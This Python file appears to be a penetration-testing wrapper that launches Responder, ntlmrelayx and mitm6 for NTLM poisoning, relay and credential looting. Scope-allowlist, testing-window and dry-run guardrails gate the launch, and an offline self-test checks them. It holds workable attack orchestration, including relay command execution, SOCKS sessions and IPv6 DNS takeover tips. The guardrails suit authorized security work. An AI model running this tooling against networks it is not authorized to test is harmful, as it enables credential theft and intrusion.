#!/usr/bin/env python3
"""
relay_orchestrator.py - Guardrailed launcher for NTLM coerce -> relay -> loot.

============================================================================
 AUTHORIZED USE ONLY
----------------------------------------------------------------------------
 For use during authorized security assessments only (signed scope of
 engagement / written permission). Coercing and relaying NTLM authentication
 against systems you are not explicitly authorized to test is illegal in most
 jurisdictions. Stay within the agreed scope, relay-destination allowlist, and
 testing window. Keep your authorization letter handy.
============================================================================

WHAT THIS IS (and is NOT)
-------------------------
This is a *wrapper*. It constructs and (only when told to) launches the command
lines of EXISTING, externally-installed, publicly-audited tools:

    * Responder       - LLMNR/NBT-NS/mDNS poisoning        (lgandx/Responder)
    * ntlmrelayx.py   - the NTLM relay engine              (Impacket / fortra)
    * mitm6           - IPv6 DNS takeover coercion         (dirkjanm/mitm6)

It implements NONE of their behaviour itself. There is no poisoner, no relay
state machine, no NTLM/SMB/LDAP capture in this file. Those primitives live in
the audited tools above; this script only:

    1. builds their command lines from the engagement config,
    2. enforces guardrails BEFORE anything is launched, and
    3. records an evidence trail for the report.

If the external tools are not installed, this script detects that and prints
install guidance. It never substitutes its own implementation.

GUARDRAILS
----------
  * --allowlist FILE  : the ONLY hosts/CIDRs authorized as relay DESTINATIONS.
                        Every intended relay target is parsed and checked; if
                        ANY target falls outside the allowlist the run is
                        REFUSED (non-zero exit, refusal logged). A real gate,
                        not advisory.
  * --testing-window  : ISO start/end. Launching outside the window (per the
                        system clock) is refused.
  * DEFAULT is dry-run: print the exact commands that WOULD run, then exit.
                        Launching for real requires --run AND passing both the
                        allowlist gate and the window gate.
  * Evidence          : a timestamped JSONL log of every command constructed or
                        launched, plus captured stdout/stderr per tool.

Examples
--------
  # Verify the guardrails offline (launches nothing external):
  python3 relay_orchestrator.py --self-test

  # Dry-run (default): show the exact tool command lines, execute nothing:
  python3 relay_orchestrator.py --interface eth0 \
      --allowlist scope/relay_destinations.txt \
      --relay-target smb://10.10.20.10 --relay-target ldap://dc01.corp.local

  # Launch for real (gated): explicit --run + a valid window + clean allowlist:
  python3 relay_orchestrator.py --interface eth0 --run \
      --allowlist scope/relay_destinations.txt \
      --relay-targets-file scope/relay_targets.txt \
      --testing-window 2026-09-27T09:00:00 2026-09-27T17:00:00 \
      --socks --evidence-dir engagement/evidence

See docs/relay_runbook.md for the full coerce -> relay -> loot workflow, the
Responder.conf / mitm6 operational notes, and evidence handling.

Dependencies: Python 3.8+ stdlib only. The wrapped tools are separate installs.
"""

import argparse
import ipaddress
import json
import os
import shlex
import shutil
import subprocess
import sys
import tempfile
import time
from datetime import datetime


# ==========================================================================
# Logging / colors  (mirrors blind_sqli.py's Log for a consistent CLI feel)
# ==========================================================================
class Log:
    LEVELS = {"error": 0, "warn": 1, "info": 2, "debug": 3}
    COLORS = {"error": "31", "warn": "33", "info": "36", "debug": "90", "ok": "32"}

    def __init__(self, level="info", color=True):
        self.level = self.LEVELS.get(level, 2)
        self.color = color and sys.stderr.isatty()

    def _c(self, s, code):
        return "\033[%sm%s\033[0m" % (code, s) if self.color else s

    def _emit(self, lvl, msg, code):
        if self.LEVELS[lvl] <= self.level:
            sys.stderr.write(self._c(msg, code) + "\n")
            sys.stderr.flush()

    def error(self, m): self._emit("error", "[-] " + m, self.COLORS["error"])
    def warn(self, m):  self._emit("warn", "[!] " + m, self.COLORS["warn"])
    def info(self, m):  self._emit("info", "[*] " + m, self.COLORS["info"])
    def ok(self, m):    self._emit("info", "[+] " + m, self.COLORS["ok"])
    def debug(self, m): self._emit("debug", "[.] " + m, self.COLORS["debug"])


LOG = Log()

# Exit codes (documented so the surrounding harness / CI can branch on them).
EXIT_OK = 0
EXIT_USAGE = 1
EXIT_ALLOWLIST_REFUSED = 2
EXIT_WINDOW_REFUSED = 3
EXIT_TOOLS_MISSING = 4


# ==========================================================================
# Allowlist gate: is a relay destination in the authorized scope?
# --------------------------------------------------------------------------
# This is pure scope arithmetic. It performs NO network activity and never
# resolves DNS (a resolver could be poisoned, and offline determinism keeps
# the self-test honest). IP targets are matched against authorized CIDRs/IPs;
# hostname targets must match an authorized hostname literally.
# ==========================================================================
def parse_target_host(target):
    """Extract the bare host from a relay target spec.

    Handles 'smb://10.0.0.5:445', 'ldap://dc01.corp.local', '[fe80::1]:445',
    'http://host/path', and bare 'host' / 'host:port'. Returns a lowercased
    host string (IP literal or hostname).
    """
    t = (target or "").strip()
    if "://" in t:
        t = t.split("://", 1)[1]
    # Strip any path / query the relay spec might carry.
    t = t.split("/", 1)[0]
    if not t:
        return ""
    # Bracketed IPv6: [addr] or [addr]:port
    if t.startswith("["):
        end = t.find("]")
        if end != -1:
            return t[1:end].strip().lower()
        return t.strip("[]").lower()
    # Bare IPv6 literal (more than one ':' and no brackets) has no port here.
    if t.count(":") > 1:
        return t.lower()
    # host or host:port
    if ":" in t:
        t = t.rsplit(":", 1)[0]
    return t.strip().lower()


def load_allowlist_entries(path):
    """Read allowlist entries from a file. '#' comments and blanks ignored."""
    entries = []
    with open(path, "r", encoding="utf-8") as fh:
        for raw in fh:
            line = raw.split("#", 1)[0].strip()
            if line:
                entries.append(line)
    return entries


class Allowlist:
    """Authorized relay destinations: a set of CIDRs/IPs and hostnames."""

    def __init__(self, entries):
        self.networks = []      # list[ip_network]
        self.hostnames = set()  # lowercased exact hostnames
        self.raw = list(entries)
        for e in entries:
            e = e.strip()
            if not e:
                continue
            try:
                # strict=False lets a bare host IP become a /32 or /128.
                self.networks.append(ipaddress.ip_network(e, strict=False))
            except ValueError:
                self.hostnames.add(e.lower())

    def contains_host(self, host):
        host = (host or "").strip().lower()
        if not host:
            return False
        try:
            ip = ipaddress.ip_address(host)
        except ValueError:
            return host in self.hostnames
        return any(ip in net for net in self.networks)

    def check_targets(self, targets):
        """Return (all_ok, violations, resolved).

        violations : list of (target, host) that are OUT of scope.
        resolved   : list of (target, host, allowed) for the whole set.
        """
        violations = []
        resolved = []
        for tgt in targets:
            host = parse_target_host(tgt)
            allowed = self.contains_host(host)
            resolved.append((tgt, host, allowed))
            if not allowed:
                violations.append((tgt, host))
        return (len(violations) == 0, violations, resolved)


# ==========================================================================
# Testing-window gate: refuse to launch outside the agreed window.
# ==========================================================================
def parse_iso(s):
    """Parse an ISO-8601 timestamp. Accepts a trailing 'Z' as UTC."""
    s = (s or "").strip()
    if s.endswith("Z"):
        s = s[:-1] + "+00:00"
    return datetime.fromisoformat(s)


def now_like(reference):
    """Current time comparable to `reference` (tz-aware iff reference is)."""
    return datetime.now(reference.tzinfo) if reference.tzinfo else datetime.now()


def window_open(now, start, end):
    """True iff start <= now <= end."""
    return start <= now <= end


# ==========================================================================
# Engagement config: everything the command builders read.
# ==========================================================================
class EngagementConfig:
    def __init__(self, interface, allowlist_entries, relay_targets,
                 window=None, run=False, evidence_dir=None,
                 responder_bin="Responder", ntlmrelayx_bin="ntlmrelayx.py",
                 mitm6_bin="mitm6", responder_analyze=False,
                 use_mitm6=False, domain=None, smb2support=True,
                 socks=False, interactive=False, relay_command=None,
                 responder_extra="", ntlmrelayx_extra="", mitm6_extra=""):
        self.interface = interface
        self.allowlist_entries = list(allowlist_entries)
        self.relay_targets = list(relay_targets)
        self.window = window                # None or (start_dt, end_dt)
        self.run = run
        self.evidence_dir = evidence_dir or default_evidence_dir()
        self.responder_bin = responder_bin
        self.ntlmrelayx_bin = ntlmrelayx_bin
        self.mitm6_bin = mitm6_bin
        self.responder_analyze = responder_analyze
        self.use_mitm6 = use_mitm6
        self.domain = domain
        self.smb2support = smb2support
        self.socks = socks
        self.interactive = interactive
        self.relay_command = relay_command
        self.responder_extra = responder_extra
        self.ntlmrelayx_extra = ntlmrelayx_extra
        self.mitm6_extra = mitm6_extra


def default_evidence_dir():
    return os.path.join("evidence", "relay-" + time.strftime("%Y%m%d-%H%M%S"))


# ==========================================================================
# Command construction. Each builder returns a ToolInvocation describing an
# external tool's argv. NOTHING here launches anything.
# ==========================================================================
class ToolInvocation:
    def __init__(self, name, argv, cwd=None, note=""):
        self.name = name          # short label, e.g. "ntlmrelayx"
        self.bin = argv[0]        # executable to look up with shutil.which
        self.argv = argv          # full argv list
        self.cwd = cwd            # working dir (loot lands here for the relay)
        self.note = note          # operator-facing reminder

    def command_string(self):
        return " ".join(shlex.quote(a) for a in self.argv)


def build_responder_cmd(cfg):
    """Poisoning front-end. Responder answers LLMNR/NBT-NS/mDNS.

    NB: when relaying, Responder's own SMB and HTTP servers MUST be set to Off
    in Responder.conf so ntlmrelayx can bind them (see docs/relay_runbook.md).
    """
    argv = [cfg.responder_bin, "-I", cfg.interface]
    if cfg.responder_analyze:
        argv.append("-A")   # passive analyze mode (no active poisoning)
    argv += shlex.split(cfg.responder_extra or "")
    note = ("Set SMB=Off and HTTP=Off in Responder.conf before relaying so "
            "ntlmrelayx can bind those ports.")
    return ToolInvocation("responder", argv, note=note)


def build_mitm6_cmd(cfg):
    """Optional IPv6 DNS-takeover coercion front-end."""
    argv = [cfg.mitm6_bin, "-i", cfg.interface]
    if cfg.domain:
        argv += ["-d", cfg.domain]
    argv += shlex.split(cfg.mitm6_extra or "")
    note = "IPv6 DNS takeover. Pair with ntlmrelayx '-6' and a WPAD payload."
    return ToolInvocation("mitm6", argv, note=note)


def build_ntlmrelayx_cmd(cfg, targets_file, loot_dir):
    """The relay engine. Targets come from a file the allowlist gate cleared."""
    argv = [cfg.ntlmrelayx_bin, "-tf", targets_file]
    if cfg.smb2support:
        argv.append("-smb2support")
    if cfg.use_mitm6:
        argv.append("-6")
    if cfg.socks:
        argv.append("-socks")
    if cfg.interactive:
        argv.append("-i")
    if cfg.relay_command:
        argv += ["-c", cfg.relay_command]
    argv += shlex.split(cfg.ntlmrelayx_extra or "")
    note = ("Relays only to the allowlist-cleared targets in %s. Loot (dumps, "
            "captured hashes) is written under %s." % (targets_file, loot_dir))
    return ToolInvocation("ntlmrelayx", argv, cwd=loot_dir, note=note)


def build_plan(cfg, targets_file, loot_dir):
    """Assemble the ordered list of tool invocations for this engagement.

    Order: relay listener first (binds SMB/HTTP), then the poisoning
    front-ends that coerce auth toward it.
    """
    plan = [build_ntlmrelayx_cmd(cfg, targets_file, loot_dir),
            build_responder_cmd(cfg)]
    if cfg.use_mitm6:
        plan.append(build_mitm6_cmd(cfg))
    return plan


# ==========================================================================
# Evidence: timestamped JSONL of everything constructed/launched.
# ==========================================================================
class Evidence:
    def __init__(self, root):
        self.root = root
        self._ready = False
        self.jsonl_path = os.path.join(root, "relay_orchestrator.jsonl")

    def _ensure(self):
        if not self._ready:
            os.makedirs(self.root, exist_ok=True)
            self._ready = True

    def path(self, *parts):
        return os.path.join(self.root, *parts)

    def log(self, event, **fields):
        self._ensure()
        rec = {"ts": datetime.now().astimezone().isoformat(), "event": event}
        rec.update(fields)
        with open(self.jsonl_path, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(rec, default=str) + "\n")
        return rec


# ==========================================================================
# Launcher indirection. The default launcher shells out to the real tools;
# the self-test injects a spy so it can prove NOTHING is executed.
# ==========================================================================
def subprocess_launcher(invocation, stdout_path, stderr_path):
    """Start one external tool, streaming its output to evidence files."""
    out = open(stdout_path, "wb")
    err = open(stderr_path, "wb")
    proc = subprocess.Popen(invocation.argv, cwd=invocation.cwd,
                            stdout=out, stderr=err)
    return proc, (out, err)


def execute_plan(plan, evidence, launcher):
    """Launch each cleared tool and wait until interrupted, then tear down."""
    procs = []
    handles = []
    try:
        for inv in plan:
            stdout_path = evidence.path("%s.stdout.log" % inv.name)
            stderr_path = evidence.path("%s.stderr.log" % inv.name)
            LOG.info("Launching %s: %s" % (inv.name, inv.command_string()))
            proc, fhs = launcher(inv, stdout_path, stderr_path)
            procs.append((inv, proc))
            handles.append(fhs)
            evidence.log("launched", tool=inv.name, argv=inv.argv,
                         cwd=inv.cwd, pid=getattr(proc, "pid", None),
                         stdout=stdout_path, stderr=stderr_path)
        LOG.ok("All tools launched. Press Ctrl-C to stop and collect evidence.")
        while any(p.poll() is None for _, p in procs):
            time.sleep(0.5)
    except KeyboardInterrupt:
        LOG.warn("Interrupted - terminating tools.")
    finally:
        for inv, proc in procs:
            if proc.poll() is None:
                proc.terminate()
            try:
                rc = proc.wait(timeout=10)
            except Exception:
                proc.kill()
                rc = proc.wait()
            evidence.log("exited", tool=inv.name, returncode=rc)
            LOG.info("%s exited rc=%s" % (inv.name, rc))
        for out, err in handles:
            try:
                out.close(); err.close()
            except Exception:
                pass


# ==========================================================================
# Orchestration: gates, then dry-run OR (gated) launch. Injectable deps make
# this fully testable offline.
# ==========================================================================
def run_orchestrator(cfg, now=None, launcher=None, which=None, out=None):
    which = which or shutil.which
    out = out or (lambda s: print(s))
    launcher = launcher or subprocess_launcher
    evidence = Evidence(cfg.evidence_dir)

    evidence.log("session", interface=cfg.interface,
                 allowlist=cfg.allowlist_entries,
                 relay_targets=cfg.relay_targets,
                 window=[cfg.window[0].isoformat(), cfg.window[1].isoformat()] if cfg.window else None,
                 mode="run" if cfg.run else "dry-run")

    # ----- GATE 1: allowlist. Enforced in BOTH dry-run and run. -----------
    allow = Allowlist(cfg.allowlist_entries)
    ok, violations, resolved = allow.check_targets(cfg.relay_targets)
    if not ok:
        evidence.log("refusal", gate="allowlist",
                     reason="relay target(s) outside authorized allowlist",
                     violations=[{"target": t, "host": h} for t, h in violations])
        LOG.error("REFUSED: %d relay target(s) fall OUTSIDE the allowlist:" % len(violations))
        for t, h in violations:
            LOG.error("    %s  (host %s not in allowlist)" % (t, h))
        LOG.error("Fix the target list or the allowlist. Nothing was constructed or launched.")
        return EXIT_ALLOWLIST_REFUSED
    evidence.log("allowlist_gate_pass",
                 targets=[{"target": t, "host": h} for t, h, _ in resolved])
    LOG.ok("Allowlist gate passed: all %d relay target(s) are in scope." % len(resolved))

    # Build the command plan (references a targets file the gate just cleared).
    targets_file = evidence.path("relay_targets.txt")
    loot_dir = evidence.path("loot")
    plan = build_plan(cfg, targets_file, loot_dir)

    # ----- DRY-RUN (default): print exactly what WOULD run, execute nothing.
    if not cfg.run:
        out("")
        out("=== DRY-RUN (no --run): the following would be executed ===")
        out("# interface     : %s" % cfg.interface)
        out("# evidence dir   : %s" % cfg.evidence_dir)
        out("# relay targets  : %s" % ", ".join(cfg.relay_targets))
        out("#   (would be written to %s)" % targets_file)
        if cfg.window:
            s, e = cfg.window
            state = "OPEN" if window_open(now_like(s), s, e) else "CLOSED"
            out("# testing window : %s .. %s  [currently %s]" % (s.isoformat(), e.isoformat(), state))
        else:
            out("# testing window : (none set - REQUIRED before --run)")
        for inv in plan:
            out("")
            out("# %s -- %s" % (inv.name, inv.note))
            if inv.cwd:
                out("#   (run from: %s)" % inv.cwd)
            out(inv.command_string())
            evidence.log("command_constructed", mode="dry-run", tool=inv.name,
                         argv=inv.argv, cwd=inv.cwd)
        out("")
        out("=== end dry-run. Re-run with --run (plus a valid --testing-window) to launch. ===")
        LOG.ok("Dry-run complete. Constructed %d command(s); launched nothing." % len(plan))
        return EXIT_OK

    # ----- GATE 2: testing window. Required to launch. --------------------
    if not cfg.window:
        evidence.log("refusal", gate="window", reason="no testing window provided for --run")
        LOG.error("REFUSED: --run requires --testing-window START END. Nothing launched.")
        return EXIT_WINDOW_REFUSED
    start, end = cfg.window
    now = now if now is not None else now_like(start)
    if not window_open(now, start, end):
        evidence.log("refusal", gate="window",
                     reason="current time outside testing window",
                     now=now.isoformat(), start=start.isoformat(), end=end.isoformat())
        LOG.error("REFUSED: %s is outside the testing window %s .. %s. Nothing launched." % (
            now.isoformat(), start.isoformat(), end.isoformat()))
        return EXIT_WINDOW_REFUSED
    evidence.log("window_gate_pass", now=now.isoformat(),
                 start=start.isoformat(), end=end.isoformat())
    LOG.ok("Window gate passed: %s is within %s .. %s." % (
        now.isoformat(), start.isoformat(), end.isoformat()))

    # ----- Tool presence: detect missing installs; never substitute. ------
    missing = [inv for inv in plan if which(inv.bin) is None]
    if missing:
        LOG.error("REFUSED: required external tool(s) not found on PATH:")
        for inv in missing:
            LOG.error("    %s  (for %s)" % (inv.bin, inv.name))
        _print_install_guidance(out, {inv.name for inv in missing})
        evidence.log("refusal", gate="tools",
                     reason="external tool(s) not installed",
                     missing=[inv.bin for inv in missing])
        return EXIT_TOOLS_MISSING

    # ----- Materialize targets file + loot dir, then launch. --------------
    os.makedirs(loot_dir, exist_ok=True)
    with open(targets_file, "w", encoding="utf-8") as fh:
        fh.write("\n".join(cfg.relay_targets) + "\n")
    evidence.log("targets_file_written", path=targets_file, targets=cfg.relay_targets)
    for inv in plan:
        evidence.log("command_constructed", mode="run", tool=inv.name,
                     argv=inv.argv, cwd=inv.cwd)
    execute_plan(plan, evidence, launcher)
    LOG.ok("Run complete. Evidence in %s" % cfg.evidence_dir)
    return EXIT_OK


def _print_install_guidance(out, names):
    out("")
    out("These are separate, publicly-available tools this wrapper only drives.")
    out("Install the missing one(s), then re-run:")
    if "responder" in names:
        out("  Responder : https://github.com/lgandx/Responder")
        out("              (Kali/Parrot: `sudo apt install responder`)")
    if "ntlmrelayx" in names:
        out("  ntlmrelayx: part of Impacket - https://github.com/fortra/impacket")
        out("              `pipx install impacket`  (or `pip install impacket`)")
    if "mitm6" in names:
        out("  mitm6     : https://github.com/dirkjanm/mitm6")
        out("              `pipx install mitm6`  (or `pip install mitm6`)")
    out("Override the executable name/path with --responder-bin / --ntlmrelayx-bin / --mitm6-bin.")


# ==========================================================================
# Offline self-test: exercises the guardrails + command construction only.
# Launches NOTHING external and passes even if Responder/Impacket/mitm6 are
# not installed. No network.
# ==========================================================================
def self_test():
    LOG.info("Self-test: exercising guardrails (offline, launches nothing)...")
    results = {}

    def check(name, got, expected):
        ok = got == expected
        results[name] = ok
        (LOG.ok if ok else LOG.error)("%-34s %s" % (
            name, "PASS" if ok else "FAIL got=%r exp=%r" % (got, expected)))

    ev_root = tempfile.mkdtemp(prefix="relay-selftest-")
    allowlist = ["10.10.20.0/24", "192.168.56.10", "dc01.corp.local"]

    # Target-host parsing feeds the gate; verify it strips schemes/ports/paths.
    check("parse smb scheme+port", parse_target_host("smb://10.10.20.10:445"), "10.10.20.10")
    check("parse ldap hostname", parse_target_host("ldap://dc01.corp.local"), "dc01.corp.local")
    check("parse bracketed ipv6", parse_target_host("[fe80::1]:445"), "fe80::1")
    check("parse bare host", parse_target_host("10.10.20.99"), "10.10.20.99")

    al = Allowlist(allowlist)
    check("host in CIDR", al.contains_host("10.10.20.55"), True)
    check("host is exact IP", al.contains_host("192.168.56.10"), True)
    check("host exact hostname", al.contains_host("dc01.corp.local"), True)
    check("host outside CIDR", al.contains_host("192.168.1.1"), False)
    check("unknown hostname", al.contains_host("evil.attacker.tld"), False)

    # (a) An out-of-allowlist relay target is REFUSED.
    spy_a = _SpyLauncher()
    cfg_a = EngagementConfig(
        interface="eth0", allowlist_entries=allowlist,
        relay_targets=["smb://10.10.20.10", "ldap://192.168.1.1"],
        run=False, evidence_dir=os.path.join(ev_root, "a"))
    rc_a = run_orchestrator(cfg_a, launcher=spy_a.launch, which=lambda b: None,
                            out=lambda s: None)
    ok_flag, viol, _ = al.check_targets(cfg_a.relay_targets)
    check("(a) out-of-scope detected", (ok_flag, len(viol)), (False, 1))
    check("(a) out-of-scope refused rc", rc_a, EXIT_ALLOWLIST_REFUSED)
    check("(a) refusal launched nothing", spy_a.calls, 0)

    # (b) An all-in-allowlist set PASSES the gate.
    all_in = ["smb://10.10.20.10", "ldap://dc01.corp.local", "192.168.56.10"]
    ok_b, viol_b, _ = al.check_targets(all_in)
    check("(b) all-in-scope passes", (ok_b, len(viol_b)), (True, 0))

    # (c) Dry-run prints commands WITHOUT executing.
    printed = []
    spy_c = _SpyLauncher()
    cfg_c = EngagementConfig(
        interface="eth0", allowlist_entries=allowlist, relay_targets=all_in,
        use_mitm6=True, domain="corp.local", socks=True, run=False,
        evidence_dir=os.path.join(ev_root, "c"))
    rc_c = run_orchestrator(cfg_c, launcher=spy_c.launch, which=lambda b: None,
                            out=printed.append)
    blob = "\n".join(printed)
    check("(c) dry-run rc ok", rc_c, EXIT_OK)
    check("(c) dry-run launched nothing", spy_c.calls, 0)
    check("(c) dry-run shows ntlmrelayx", cfg_c.ntlmrelayx_bin in blob, True)
    check("(c) dry-run shows responder", cfg_c.responder_bin in blob, True)
    check("(c) dry-run shows mitm6", cfg_c.mitm6_bin in blob, True)
    check("(c) dry-run shows -tf targets", "-tf" in blob, True)

    # (d) Out-of-window is REFUSED (even with a clean allowlist).
    start = parse_iso("2020-01-01T09:00:00")
    end = parse_iso("2020-01-01T17:00:00")
    check("(d) window_open before", window_open(parse_iso("2020-01-01T08:00:00"), start, end), False)
    check("(d) window_open inside", window_open(parse_iso("2020-01-01T12:00:00"), start, end), True)
    check("(d) window_open after", window_open(parse_iso("2020-01-01T18:00:00"), start, end), False)
    spy_d = _SpyLauncher()
    cfg_d = EngagementConfig(
        interface="eth0", allowlist_entries=allowlist, relay_targets=all_in,
        window=(start, end), run=True, evidence_dir=os.path.join(ev_root, "d"))
    rc_d = run_orchestrator(cfg_d, now=parse_iso("2020-01-01T18:30:00"),
                            launcher=spy_d.launch, which=lambda b: "/usr/bin/" + b,
                            out=lambda s: None)
    check("(d) out-of-window refused rc", rc_d, EXIT_WINDOW_REFUSED)
    check("(d) out-of-window launched nothing", spy_d.calls, 0)

    # Bonus: --run with a clean allowlist + open window but tools MISSING must
    # refuse with install guidance and still launch nothing (proves the wrapper
    # never substitutes its own implementation).
    spy_m = _SpyLauncher()
    cfg_m = EngagementConfig(
        interface="eth0", allowlist_entries=allowlist, relay_targets=all_in,
        window=(start, end), run=True, evidence_dir=os.path.join(ev_root, "m"))
    rc_m = run_orchestrator(cfg_m, now=parse_iso("2020-01-01T12:00:00"),
                            launcher=spy_m.launch, which=lambda b: None,
                            out=lambda s: None)
    check("tools-missing refused rc", rc_m, EXIT_TOOLS_MISSING)
    check("tools-missing launched nothing", spy_m.calls, 0)

    # Command construction shape checks (no external calls).
    inv = build_ntlmrelayx_cmd(cfg_c, "/tmp/t.txt", "/tmp/loot")
    check("ntlmrelayx uses -tf", "-tf" in inv.argv and "/tmp/t.txt" in inv.argv, True)
    check("ntlmrelayx -6 with mitm6", "-6" in inv.argv, True)
    check("ntlmrelayx loot cwd", inv.cwd, "/tmp/loot")

    shutil.rmtree(ev_root, ignore_errors=True)

    passed = sum(results.values())
    total = len(results)
    print()
    (LOG.ok if passed == total else LOG.error)(
        "Self-test: %d/%d checks passed." % (passed, total))
    return EXIT_OK if passed == total else EXIT_USAGE


class _SpyLauncher:
    """Records launch attempts so the self-test can prove nothing ran."""
    def __init__(self):
        self.calls = 0

    def launch(self, invocation, stdout_path, stderr_path):
        self.calls += 1
        raise AssertionError("self-test launcher must never be invoked")


# ==========================================================================
# CLI
# ==========================================================================
def parse_args(argv):
    p = argparse.ArgumentParser(
        description="Guardrailed launcher/wrapper for Responder + ntlmrelayx.py "
                    "(+ optional mitm6). Authorized testing only.",
        epilog="DEFAULT is dry-run. Launching requires --run plus passing the "
               "allowlist and testing-window gates. Full workflow: "
               "docs/relay_runbook.md. Verify guardrails offline: --self-test.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter)

    g = p.add_argument_group("scope / authorization (the gates)")
    g.add_argument("--allowlist", metavar="FILE",
                   help="File of authorized relay DESTINATIONS (IP/CIDR/hostname "
                        "per line, '#' comments ok). REQUIRED. A real gate.")
    g.add_argument("--relay-target", action="append", default=[], metavar="TARGET",
                   help="An intended relay target, e.g. smb://10.0.0.5 or "
                        "ldap://dc01.corp.local (repeatable).")
    g.add_argument("--relay-targets-file", metavar="FILE",
                   help="File of intended relay targets, one per line.")
    g.add_argument("--testing-window", nargs=2, metavar=("START", "END"),
                   help="ISO-8601 start/end. Launching outside this window is "
                        "refused. REQUIRED for --run.")

    g = p.add_argument_group("poisoning / coercion front-ends")
    g.add_argument("--interface", "-I", metavar="IFACE",
                   help="Network interface for the tools. REQUIRED.")
    g.add_argument("--responder-analyze", action="store_true",
                   help="Add Responder's passive -A (analyze) mode.")
    g.add_argument("--mitm6", action="store_true",
                   help="Also build a mitm6 (IPv6 DNS takeover) command and add "
                        "-6 to ntlmrelayx.")
    g.add_argument("--domain", help="AD domain for mitm6 (-d).")

    g = p.add_argument_group("relay options (passed through to ntlmrelayx)")
    g.add_argument("--no-smb2support", action="store_true",
                   help="Omit -smb2support (added by default).")
    g.add_argument("--socks", action="store_true", help="ntlmrelayx -socks.")
    g.add_argument("--interactive", action="store_true", help="ntlmrelayx -i.")
    g.add_argument("--relay-command", metavar="CMD",
                   help="Command for ntlmrelayx to run on a relayed SMB session (-c).")
    g.add_argument("--ntlmrelayx-extra", default="",
                   help="Extra raw args appended to ntlmrelayx (quoted string).")
    g.add_argument("--responder-extra", default="",
                   help="Extra raw args appended to Responder (quoted string).")
    g.add_argument("--mitm6-extra", default="",
                   help="Extra raw args appended to mitm6 (quoted string).")

    g = p.add_argument_group("tool binaries (this wrapper only drives these)")
    g.add_argument("--responder-bin", default="Responder", help="Responder executable.")
    g.add_argument("--ntlmrelayx-bin", default="ntlmrelayx.py", help="ntlmrelayx executable.")
    g.add_argument("--mitm6-bin", default="mitm6", help="mitm6 executable.")

    g = p.add_argument_group("evidence / control")
    g.add_argument("--evidence-dir", metavar="DIR",
                   help="Where to write the JSONL log, loot, and captured output.")
    g.add_argument("--run", action="store_true",
                   help="Actually launch (gated). Without it, dry-run only.")
    g.add_argument("--dry-run", action="store_true",
                   help="Force dry-run even if --run is given (default behaviour).")
    g.add_argument("-v", "--verbose", action="count", default=0, help="-v info, -vv debug.")
    g.add_argument("--no-color", action="store_true")
    g.add_argument("--self-test", action="store_true",
                   help="Run the offline guardrail self-test (launches nothing).")
    return p.parse_args(argv)


def main(argv=None):
    args = parse_args(sys.argv[1:] if argv is None else argv)

    global LOG
    LOG = Log(level={0: "info", 1: "info", 2: "debug"}.get(args.verbose, "debug"),
              color=not args.no_color)

    if args.self_test:
        return self_test()

    # Validate the required guardrail inputs (mirrors blind_sqli.py's approach:
    # requiredness enforced in main so --self-test needs no target).
    if not args.allowlist:
        raise SystemExit("--allowlist FILE is required (or use --self-test).")
    if not args.interface:
        raise SystemExit("--interface IFACE is required (or use --self-test).")

    try:
        allowlist_entries = load_allowlist_entries(args.allowlist)
    except OSError as e:
        raise SystemExit("Cannot read allowlist %s: %s" % (args.allowlist, e))
    if not allowlist_entries:
        raise SystemExit("Allowlist %s is empty - refusing (no authorized "
                         "relay destinations)." % args.allowlist)

    targets = list(args.relay_target)
    if args.relay_targets_file:
        try:
            with open(args.relay_targets_file, "r", encoding="utf-8") as fh:
                for raw in fh:
                    line = raw.split("#", 1)[0].strip()
                    if line:
                        targets.append(line)
        except OSError as e:
            raise SystemExit("Cannot read relay targets file %s: %s" % (
                args.relay_targets_file, e))
    if not targets:
        raise SystemExit("At least one relay target is required "
                         "(--relay-target / --relay-targets-file).")

    window = None
    if args.testing_window:
        try:
            start = parse_iso(args.testing_window[0])
            end = parse_iso(args.testing_window[1])
        except ValueError as e:
            raise SystemExit("Bad --testing-window timestamp: %s" % e)
        if bool(start.tzinfo) != bool(end.tzinfo):
            raise SystemExit("--testing-window START and END must both be tz-aware "
                             "or both naive.")
        if end <= start:
            raise SystemExit("--testing-window END must be after START.")
        window = (start, end)

    cfg = EngagementConfig(
        interface=args.interface,
        allowlist_entries=allowlist_entries,
        relay_targets=targets,
        window=window,
        run=args.run and not args.dry_run,
        evidence_dir=args.evidence_dir,
        responder_bin=args.responder_bin,
        ntlmrelayx_bin=args.ntlmrelayx_bin,
        mitm6_bin=args.mitm6_bin,
        responder_analyze=args.responder_analyze,
        use_mitm6=args.mitm6,
        domain=args.domain,
        smb2support=not args.no_smb2support,
        socks=args.socks,
        interactive=args.interactive,
        relay_command=args.relay_command,
        responder_extra=args.responder_extra,
        ntlmrelayx_extra=args.ntlmrelayx_extra,
        mitm6_extra=args.mitm6_extra)

    if cfg.window:
        LOG.info("Testing window: %s .. %s" % (
            cfg.window[0].isoformat(), cfg.window[1].isoformat()))
    LOG.info("Evidence dir: %s" % cfg.evidence_dir)
    return run_orchestrator(cfg)


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        LOG.warn("Interrupted.")
        sys.exit(130)
